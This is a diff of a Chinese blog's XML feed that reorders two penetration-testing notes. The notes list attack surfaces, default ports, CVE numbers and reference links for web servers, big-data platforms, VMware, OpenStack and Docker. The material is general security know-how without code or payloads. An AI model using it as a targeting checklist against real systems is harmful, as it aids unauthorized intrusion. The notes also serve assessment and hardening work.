+<h3 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">•   https://www.seebug.org/vuldb/ssvid-92538</span><br><span class="line">•   解析漏洞</span><br><span class="line">•   目录遍历</span><br><span class="line">•   CVE-2016-1247：需要获取主机操作权限，攻击者可通过软链接任意文件来替换日志文件，从而实现提权以获取服务器的root权限。</span><br><span class="line">•   端口：80</span><br><span class="line">lighttpd</span><br><span class="line"></span><br><span class="line">•   目录遍历</span><br><span class="line">•   端口：80</span><br></pre></td></tr></table></figure>
 
 
 
@@ -3197,28 +3245,25 @@
       </tags>
   </entry>
   <entry>
-    <title>（六）渗透技巧—大数据</title>
-    <url>/2019/04/15/%EF%BC%88%E5%85%AD%EF%BC%89%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7%E2%80%94%E5%A4%A7%E6%95%B0%E6%8D%AE/</url>
+    <title>（五）渗透技巧—云环境</title>
+    <url>/2019/04/15/%EF%BC%88%E4%BA%94%EF%BC%89%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7%E2%80%94%E4%BA%91%E7%8E%AF%E5%A2%83/</url>
     <content><![CDATA[<blockquote>
 <p>文章不记得从哪个公众号上拉下来的了</p>
 </blockquote><a id="more"></a>
-<h3 id="1、Elsaticsearch"><a href="#1、Elsaticsearch" class="headerlink" title="1、Elsaticsearch"></a>1、Elsaticsearch</h3><p>Elasticsearch 是一个分布式的搜索和分析引擎，可以用于全文检索、结构化检索和分析，并能将这三者结合起来。Elasticsearch 基于 Lucene 开发，现在是使用最广的开源搜索引擎之一，Wikipedia、Stack Overflow、GitHub 等都基于 Elasticsearch 来构建他们的搜索引擎。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">默认端口：9200、9300</span><br><span class="line"></span><br><span class="line">攻击方法：</span><br><span class="line">•   未授权访问；</span><br><span class="line">•   远程命令执行；</span><br><span class="line">•   文件遍历；</span><br><span class="line">•   低版本webshell植入；</span><br><span class="line"></span><br><span class="line">参考：</span><br><span class="line">http://www.freebuf.com/sectool/38025.html</span><br><span class="line"></span><br><span class="line">https://www.secpulse.com/archives/5401.html</span><br></pre></td></tr></table></figure>
-<h3 id="2、hadoop"><a href="#2、hadoop" class="headerlink" title="2、hadoop"></a>2、hadoop</h3><p>Hadoop是一个开源的框架，可编写和运行分布式应用处理大规模数据，是专为离线和大规模数据分析而设计的，并不适合那种对几个记录随机读写的在线事务处理模式。</p>
-<p>Hadoop=HDFS（文件系统，数据存储技术相关）+ Mapreduce（数据处理），Hadoop的数据来源可以是任何形式，在处理半结构化和非结构化数据上与关系型数据库相比有更好的性能，具有更灵活的处理能力，不管任何数据形式最终会转化为key/value，key/value是基本数据单元。</p>
-<p>用函数式变成Mapreduce代替SQL，SQL是查询语句，而Mapreduce则是使用脚本和代码，而对于适用于关系型数据库，习惯SQL的Hadoop有开源工具hive代替。 Hadoop就是一个分布式计算的解决方案。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">参考：</span><br><span class="line">https://tech.meituan.com/hadoop-security-practice.html</span><br><span class="line"></span><br><span class="line">https://zhuanlan.zhihu.com/p/33525241</span><br><span class="line"></span><br><span class="line">https://www.anquanke.com/post/id/85343</span><br><span class="line"></span><br><span class="line">https://www.cloudera.com/documentation/cdh/5-0-x/CDH5-Security-Guide/cdh5sg_hadoop_security_intro.html</span><br></pre></td></tr></table></figure>
-<h3 id="3、Hive"><a href="#3、Hive" class="headerlink" title="3、Hive"></a>3、Hive</h3><p>Hive是Hadoop家族中一款数据仓库产品，Hive最大的特点就是提供了类SQL的语法，封装了底层的MapReduce过程，让有SQL基础的业务人员，也可以直接利用Hadoop进行大数据的操作。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">参考：</span><br><span class="line">https://cwiki.apache.org/confluence/display/Hive/Security</span><br><span class="line"></span><br><span class="line">https://www.cnblogs.com/yejibigdata/p/6394719.html</span><br></pre></td></tr></table></figure>
-<h3 id="4、Sqoop"><a href="#4、Sqoop" class="headerlink" title="4、Sqoop"></a>4、Sqoop</h3><p>Apache Sqoop（SQL-to-Hadoop） 项目旨在协助 RDBMS 与 Hadoop 之间进行高效的大数据交流。</p>
-<p>用户可以在 Sqoop 的帮助下，轻松地把关系型数据库的数据导入到 Hadoop 与其相关的系统 (如HBase和Hive)中；同时也可以把数据从 Hadoop 系统里抽取并导出到关系型数据库里。除了这些主要的功能外，Sqoop 也提供了一些诸如查看数据库表等实用的小工具。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">参考：</span><br><span class="line">https://sqoop.apache.org/docs/1.99.7/security.html</span><br></pre></td></tr></table></figure>
-<h3 id="5、HBase"><a href="#5、HBase" class="headerlink" title="5、HBase"></a>5、HBase</h3><p>HBase建立在HDFS之上，提供高可靠性、高性能、列存储、可伸缩、实时读写的数据库系统。</p>
-<p>它介于NoSQL和RDBMS之间，仅能通过行键(row key)和行键序列来检索数据，仅支持单行事务(可通过Hive支持来实现多表联合等复杂操作)。主要用来存储非结构化和半结构化的松散数据。</p>
-<p>与Hadoop一样，HBase目标主要依靠横向扩展，通过不断增加廉价的商用服务器，来增加计算和存储能力。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">参考：</span><br><span class="line">https://www.cloudera.com/documentation/enterprise/5-6-x/topics/admin_hbase_security.html</span><br><span class="line">https://www.cloudera.com/documentation/cdh/5-1-x/CDH5-Security-Guide/cdh5sg_hbase_security.html</span><br></pre></td></tr></table></figure>
-<h3 id="6、Spark"><a href="#6、Spark" class="headerlink" title="6、Spark"></a>6、Spark</h3><p>Spark是UC Berkeley AMP lab所开源的类Hadoop MapReduce的通用的并行计算框架，Spark基于map reduce算法实现的分布式计算，拥有Hadoop MapReduce所具有的优点；但不同于MapReduce的是Job中间输出和结果可以保存在内存中，从而不再需要读写HDFS。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">参考：</span><br><span class="line">http://cwiki.apachecn.org/pages/viewpage.action?pageId=2887905</span><br></pre></td></tr></table></figure>
+<h3 id="1、VMware"><a href="#1、VMware" class="headerlink" title="1、VMware"></a>1、VMware</h3><p>使用 VMware vCloud 可将现有数据中心内的虚拟基础架构资源池化，并将其作为基于目录的服务交付。通过与云计算基础架构的最佳平台 VMware vSphere 配合使用，VMware vCloud Director 可为客户提供构建安全的私有云，从而改变 IT 部门交付和管理基础架构服务以及用户访问和使用这些服务的方式。<br>一般组织中很多独立安装的 Esxi 形式的私有云，或独立部署的虚拟化系统。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">端口（很多）：</span><br><span class="line">https://kb.vmware.com/s/article/2115330</span><br><span class="line">https://kb.vmware.com/s/article/2081930</span><br><span class="line"></span><br><span class="line">漏洞：</span><br><span class="line">•   主机逃逸</span><br><span class="line">•   CVE-2017-5638</span><br><span class="line"></span><br><span class="line">参考：</span><br><span class="line">https://paper.seebug.org/348/</span><br><span class="line"></span><br><span class="line">http://www.freebuf.com/articles/system/141179.html</span><br><span class="line"></span><br><span class="line">http://www.mottoin.com/100651.html</span><br><span class="line"></span><br><span class="line">http://www.52bug.cn/%E9%BB%91%E5%AE%A2%E6%8A%80%E6%9C%AF/4375.html</span><br><span class="line"></span><br><span class="line">Tweets by VMwareSRC</span><br><span class="line"></span><br><span class="line">https://loudong.sjtu.edu.cn/?keyword=vmware&amp;serverity=%E9%AB%98%E5%8D%B1&amp;page=1</span><br><span class="line"></span><br><span class="line">https://www.vmware.com/cn/security/hardening-guides.html</span><br></pre></td></tr></table></figure>
+<h3 id="2、OpenStack"><a href="#2、OpenStack" class="headerlink" title="2、OpenStack"></a>2、OpenStack</h3><p>OpenStack是基础设施即服务（IaaS）软件，让任何人都可以自行创建和提供云计算服务。此外，OpenStack也用作创建防火墙内的“私有云”（Private Cloud），提供机构或企业内各部门共享资源。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">漏洞，有漏洞但是POC基本没有。检查时候可以参考安全的配置实践。</span><br><span class="line">•   权限绕过漏洞</span><br><span class="line">•   信息泄露</span><br><span class="line">•   代码执行漏洞</span><br><span class="line"></span><br><span class="line">参考：</span><br><span class="line">https://loudong.sjtu.edu.cn/?keyword=openstack&amp;serverity=%E9%AB%98%E5%8D%B1</span><br><span class="line"></span><br><span class="line">https://docs.openstack.org/liberty/zh_CN/install-guide-obs/environment-security.html</span><br><span class="line"></span><br><span class="line">http://www.freebuf.com/news/topnews/107203.html</span><br></pre></td></tr></table></figure>
+<h3 id="3、Docker"><a href="#3、Docker" class="headerlink" title="3、Docker"></a>3、Docker</h3><p>Docker是一个开放源代码软件项目，让应用程序布署在软件容器下的工作可以自动化进行，借此在Linux操作系统上，提供一个额外的软件抽象层，以及操作系统层虚拟化的自动管理机制。</p>
+<p>Docker利用Linux核心中的资源分脱机制，例如cgroups，以及Linux核心名字空间（name space），来创建独立的软件容器（containers）。这可以在单一Linux实体下运作，避免引导一个虚拟机造成的额外负担。</p>
+<p>Linux核心对名字空间的支持完全隔离了工作环境中应用程序的视野，包括进程树、网络、用户ID与挂载文件系统，而核心的cgroup提供资源隔离，包括CPU、内存、block I/O与网络。</p>
+<p>从0.9版本起，Dockers在使用抽象虚拟是经由libvirt的LXC与systemd - nspawn提供界面的基础上，开始包括libcontainer函数库做为以自己的方式开始直接使用由Linux核心提供的虚拟化的设施。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">安全问题（很少有漏洞的POC，安全检查也是基于最佳实践和官方安全建议进行）：</span><br><span class="line">•   CVE-2015-3630 1.6.0 Docker Libcontainer 安全绕过漏洞</span><br><span class="line">•   CVE-2015-3627 1.6.1 Libcontainer和Docker Engine 权限许可和访问控制漏洞CVE-2015-3630 1.6.1 Docker Engine 安全绕过漏洞</span><br><span class="line">•   CVE-2014-9358 1.3.3 Docker 目录遍历漏洞</span><br><span class="line">•   CVE-2014-9357 1.3.2 Docker 权限许可和访问控制漏洞</span><br><span class="line">•   CVE-2014-6408 1.3.1 Docker 权限许可和访问控制漏洞</span><br><span class="line">•   CVE-2014-5277 1.3.0 Docker和docker-py 代码注入漏洞</span><br><span class="line">•   内核漏洞（Kernel exploits）容器是基于内核的虚拟化，主机（host）和主机上的所有容器共享一套内核。如果某个容器的操作造成了内核崩溃，那么反过来整台机器上的容器都会受到影响。</span><br><span class="line">•   拒绝服务攻击（Denial-of-service attacks）所有的容器都共享了内核资源，如果一个容器独占了某一个资源（内存、CPU、各种ID），可能会造成其他容器因为资源匮乏无法工作（形成DoS攻击）。</span><br><span class="line">•   容器突破（Container breakouts）Linux的namespace机制是容器的核心之一，它允许容器内部拥有一个PID=1的进程而在容器外部这个进程号又是不一样的（比如1234）。现在问题在于如果一个PID=1的进程突破了namespace的限制，那么他将会在主机上获得root权限。</span><br><span class="line">•   有毒镜像（Poisoned images）主要是考虑到镜像本身的安全性，没太多好说的。</span><br><span class="line"></span><br><span class="line">参考：</span><br><span class="line">https://toutiao.io/posts/2y9xx8/preview</span><br><span class="line"></span><br><span class="line">http://www.yunweipai.com/archives/21610.html</span><br><span class="line"></span><br><span class="line">http://www.91ri.org/15837.html</span><br><span class="line"></span><br><span class="line">https://blog.csdn.net/ruidu_doer/article/details/53401523</span><br><span class="line"></span><br><span class="line">https://loudong.sjtu.edu.cn/?keyword=docker&amp;serverity=%E9%AB%98%E5%8D%B1</span><br><span class="line"></span><br><span class="line">http://dockone.io/article/150</span><br><span class="line"></span><br><span class="line">http://www.dockerinfo.net/docker/docker%E5%AE%89%E5%85%A8</span><br><span class="line"></span><br><span class="line">https://blog.waterstrong.me/docker-security/</span><br></pre></td></tr></table></figure>
+
+
+
+
+
 
 
 
@@ -3253,25 +3298,28 @@
       </tags>
   </entry>
   <entry>
-    <title>（五）渗透技巧—云环境</title>
-    <url>/2019/04/15/%EF%BC%88%E4%BA%94%EF%BC%89%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7%E2%80%94%E4%BA%91%E7%8E%AF%E5%A2%83/</url>
+    <title>（六）渗透技巧—大数据</title>
+    <url>/2019/04/15/%EF%BC%88%E5%85%AD%EF%BC%89%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7%E2%80%94%E5%A4%A7%E6%95%B0%E6%8D%AE/</url>
     <content><![CDATA[<blockquote>
 <p>文章不记得从哪个公众号上拉下来的了</p>
 </blockquote><a id="more"></a>
-<h3 id="1、VMware"><a href="#1、VMware" class="headerlink" title="1、VMware"></a>1、VMware</h3><p>使用 VMware vCloud 可将现有数据中心内的虚拟基础架构资源池化，并将其作为基于目录的服务交付。通过与云计算基础架构的最佳平台 VMware vSphere 配合使用，VMware vCloud Director 可为客户提供构建安全的私有云，从而改变 IT 部门交付和管理基础架构服务以及用户访问和使用这些服务的方式。<br>一般组织中很多独立安装的 Esxi 形式的私有云，或独立部署的虚拟化系统。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">端口（很多）：</span><br><span class="line">https://kb.vmware.com/s/article/2115330</span><br><span class="line">https://kb.vmware.com/s/article/2081930</span><br><span class="line"></span><br><span class="line">漏洞：</span><br><span class="line">•   主机逃逸</span><br><span class="line">•   CVE-2017-5638</span><br><span class="line"></span><br><span class="line">参考：</span><br><span class="line">https://paper.seebug.org/348/</span><br><span class="line"></span><br><span class="line">http://www.freebuf.com/articles/system/141179.html</span><br><span class="line"></span><br><span class="line">http://www.mottoin.com/100651.html</span><br><span class="line"></span><br><span class="line">http://www.52bug.cn/%E9%BB%91%E5%AE%A2%E6%8A%80%E6%9C%AF/4375.html</span><br><span class="line"></span><br><span class="line">Tweets by VMwareSRC</span><br><span class="line"></span><br><span class="line">https://loudong.sjtu.edu.cn/?keyword=vmware&amp;serverity=%E9%AB%98%E5%8D%B1&amp;page=1</span><br><span class="line"></span><br><span class="line">https://www.vmware.com/cn/security/hardening-guides.html</span><br></pre></td></tr></table></figure>
-<h3 id="2、OpenStack"><a href="#2、OpenStack" class="headerlink" title="2、OpenStack"></a>2、OpenStack</h3><p>OpenStack是基础设施即服务（IaaS）软件，让任何人都可以自行创建和提供云计算服务。此外，OpenStack也用作创建防火墙内的“私有云”（Private Cloud），提供机构或企业内各部门共享资源。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">漏洞，有漏洞但是POC基本没有。检查时候可以参考安全的配置实践。</span><br><span class="line">•   权限绕过漏洞</span><br><span class="line">•   信息泄露</span><br><span class="line">•   代码执行漏洞</span><br><span class="line"></span><br><span class="line">参考：</span><br><span class="line">https://loudong.sjtu.edu.cn/?keyword=openstack&amp;serverity=%E9%AB%98%E5%8D%B1</span><br><span class="line"></span><br><span class="line">https://docs.openstack.org/liberty/zh_CN/install-guide-obs/environment-security.html</span><br><span class="line"></span><br><span class="line">http://www.freebuf.com/news/topnews/107203.html</span><br></pre></td></tr></table></figure>
-<h3 id="3、Docker"><a href="#3、Docker" class="headerlink" title="3、Docker"></a>3、Docker</h3><p>Docker是一个开放源代码软件项目，让应用程序布署在软件容器下的工作可以自动化进行，借此在Linux操作系统上，提供一个额外的软件抽象层，以及操作系统层虚拟化的自动管理机制。</p>
-<p>Docker利用Linux核心中的资源分脱机制，例如cgroups，以及Linux核心名字空间（name space），来创建独立的软件容器（containers）。这可以在单一Linux实体下运作，避免引导一个虚拟机造成的额外负担。</p>
-<p>Linux核心对名字空间的支持完全隔离了工作环境中应用程序的视野，包括进程树、网络、用户ID与挂载文件系统，而核心的cgroup提供资源隔离，包括CPU、内存、block I/O与网络。</p>
-<p>从0.9版本起，Dockers在使用抽象虚拟是经由libvirt的LXC与systemd - nspawn提供界面的基础上，开始包括libcontainer函数库做为以自己的方式开始直接使用由Linux核心提供的虚拟化的设施。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">安全问题（很少有漏洞的POC，安全检查也是基于最佳实践和官方安全建议进行）：</span><br><span class="line">•   CVE-2015-3630 1.6.0 Docker Libcontainer 安全绕过漏洞</span><br><span class="line">•   CVE-2015-3627 1.6.1 Libcontainer和Docker Engine 权限许可和访问控制漏洞CVE-2015-3630 1.6.1 Docker Engine 安全绕过漏洞</span><br><span class="line">•   CVE-2014-9358 1.3.3 Docker 目录遍历漏洞</span><br><span class="line">•   CVE-2014-9357 1.3.2 Docker 权限许可和访问控制漏洞</span><br><span class="line">•   CVE-2014-6408 1.3.1 Docker 权限许可和访问控制漏洞</span><br><span class="line">•   CVE-2014-5277 1.3.0 Docker和docker-py 代码注入漏洞</span><br><span class="line">•   内核漏洞（Kernel exploits）容器是基于内核的虚拟化，主机（host）和主机上的所有容器共享一套内核。如果某个容器的操作造成了内核崩溃，那么反过来整台机器上的容器都会受到影响。</span><br><span class="line">•   拒绝服务攻击（Denial-of-service attacks）所有的容器都共享了内核资源，如果一个容器独占了某一个资源（内存、CPU、各种ID），可能会造成其他容器因为资源匮乏无法工作（形成DoS攻击）。</span><br><span class="line">•   容器突破（Container breakouts）Linux的namespace机制是容器的核心之一，它允许容器内部拥有一个PID=1的进程而在容器外部这个进程号又是不一样的（比如1234）。现在问题在于如果一个PID=1的进程突破了namespace的限制，那么他将会在主机上获得root权限。</span><br><span class="line">•   有毒镜像（Poisoned images）主要是考虑到镜像本身的安全性，没太多好说的。</span><br><span class="line"></span><br><span class="line">参考：</span><br><span class="line">https://toutiao.io/posts/2y9xx8/preview</span><br><span class="line"></span><br><span class="line">http://www.yunweipai.com/archives/21610.html</span><br><span class="line"></span><br><span class="line">http://www.91ri.org/15837.html</span><br><span class="line"></span><br><span class="line">https://blog.csdn.net/ruidu_doer/article/details/53401523</span><br><span class="line"></span><br><span class="line">https://loudong.sjtu.edu.cn/?keyword=docker&amp;serverity=%E9%AB%98%E5%8D%B1</span><br><span class="line"></span><br><span class="line">http://dockone.io/article/150</span><br><span class="line"></span><br><span class="line">http://www.dockerinfo.net/docker/docker%E5%AE%89%E5%85%A8</span><br><span class="line"></span><br><span class="line">https://blog.waterstrong.me/docker-security/</span><br></pre></td></tr></table></figure>
-
-
-
-
-
+<h3 id="1、Elsaticsearch"><a href="#1、Elsaticsearch" class="headerlink" title="1、Elsaticsearch"></a>1、Elsaticsearch</h3><p>Elasticsearch 是一个分布式的搜索和分析引擎，可以用于全文检索、结构化检索和分析，并能将这三者结合起来。Elasticsearch 基于 Lucene 开发，现在是使用最广的开源搜索引擎之一，Wikipedia、Stack Overflow、GitHub 等都基于 Elasticsearch 来构建他们的搜索引擎。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">默认端口：9200、9300</span><br><span class="line"></span><br><span class="line">攻击方法：</span><br><span class="line">•   未授权访问；</span><br><span class="line">•   远程命令执行；</span><br><span class="line">•   文件遍历；</span><br><span class="line">•   低版本webshell植入；</span><br><span class="line"></span><br><span class="line">参考：</span><br><span class="line">http://www.freebuf.com/sectool/38025.html</span><br><span class="line"></span><br><span class="line">https://www.secpulse.com/archives/5401.html</span><br></pre></td></tr></table></figure>
+<h3 id="2、hadoop"><a href="#2、hadoop" class="headerlink" title="2、hadoop"></a>2、hadoop</h3><p>Hadoop是一个开源的框架，可编写和运行分布式应用处理大规模数据，是专为离线和大规模数据分析而设计的，并不适合那种对几个记录随机读写的在线事务处理模式。</p>
+<p>Hadoop=HDFS（文件系统，数据存储技术相关）+ Mapreduce（数据处理），Hadoop的数据来源可以是任何形式，在处理半结构化和非结构化数据上与关系型数据库相比有更好的性能，具有更灵活的处理能力，不管任何数据形式最终会转化为key/value，key/value是基本数据单元。</p>
+<p>用函数式变成Mapreduce代替SQL，SQL是查询语句，而Mapreduce则是使用脚本和代码，而对于适用于关系型数据库，习惯SQL的Hadoop有开源工具hive代替。 Hadoop就是一个分布式计算的解决方案。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">参考：</span><br><span class="line">https://tech.meituan.com/hadoop-security-practice.html</span><br><span class="line"></span><br><span class="line">https://zhuanlan.zhihu.com/p/33525241</span><br><span class="line"></span><br><span class="line">https://www.anquanke.com/post/id/85343</span><br><span class="line"></span><br><span class="line">https://www.cloudera.com/documentation/cdh/5-0-x/CDH5-Security-Guide/cdh5sg_hadoop_security_intro.html</span><br></pre></td></tr></table></figure>
+<h3 id="3、Hive"><a href="#3、Hive" class="headerlink" title="3、Hive"></a>3、Hive</h3><p>Hive是Hadoop家族中一款数据仓库产品，Hive最大的特点就是提供了类SQL的语法，封装了底层的MapReduce过程，让有SQL基础的业务人员，也可以直接利用Hadoop进行大数据的操作。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">参考：</span><br><span class="line">https://cwiki.apache.org/confluence/display/Hive/Security</span><br><span class="line"></span><br><span class="line">https://www.cnblogs.com/yejibigdata/p/6394719.html</span><br></pre></td></tr></table></figure>
+<h3 id="4、Sqoop"><a href="#4、Sqoop" class="headerlink" title="4、Sqoop"></a>4、Sqoop</h3><p>Apache Sqoop（SQL-to-Hadoop） 项目旨在协助 RDBMS 与 Hadoop 之间进行高效的大数据交流。</p>
+<p>用户可以在 Sqoop 的帮助下，轻松地把关系型数据库的数据导入到 Hadoop 与其相关的系统 (如HBase和Hive)中；同时也可以把数据从 Hadoop 系统里抽取并导出到关系型数据库里。除了这些主要的功能外，Sqoop 也提供了一些诸如查看数据库表等实用的小工具。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">参考：</span><br><span class="line">https://sqoop.apache.org/docs/1.99.7/security.html</span><br></pre></td></tr></table></figure>
+<h3 id="5、HBase"><a href="#5、HBase" class="headerlink" title="5、HBase"></a>5、HBase</h3><p>HBase建立在HDFS之上，提供高可靠性、高性能、列存储、可伸缩、实时读写的数据库系统。</p>
+<p>它介于NoSQL和RDBMS之间，仅能通过行键(row key)和行键序列来检索数据，仅支持单行事务(可通过Hive支持来实现多表联合等复杂操作)。主要用来存储非结构化和半结构化的松散数据。</p>
+<p>与Hadoop一样，HBase目标主要依靠横向扩展，通过不断增加廉价的商用服务器，来增加计算和存储能力。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">参考：</span><br><span class="line">https://www.cloudera.com/documentation/enterprise/5-6-x/topics/admin_hbase_security.html</span><br><span class="line">https://www.cloudera.com/documentation/cdh/5-1-x/CDH5-Security-Guide/cdh5sg_hbase_security.html</span><br></pre></td></tr></table></figure>
+<h3 id="6、Spark"><a href="#6、Spark" class="headerlink" title="6、Spark"></a>6、Spark</h3><p>Spark是UC Berkeley AMP lab所开源的类Hadoop MapReduce的通用的并行计算框架，Spark基于map reduce算法实现的分布式计算，拥有Hadoop MapReduce所具有的优点；但不同于MapReduce的是Job中间输出和结果可以保存在内存中，从而不再需要读写HDFS。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">参考：</span><br><span class="line">http://cwiki.apachecn.org/pages/viewpage.action?pageId=2887905</span><br></pre></td></tr></table></figure>
 
 
 
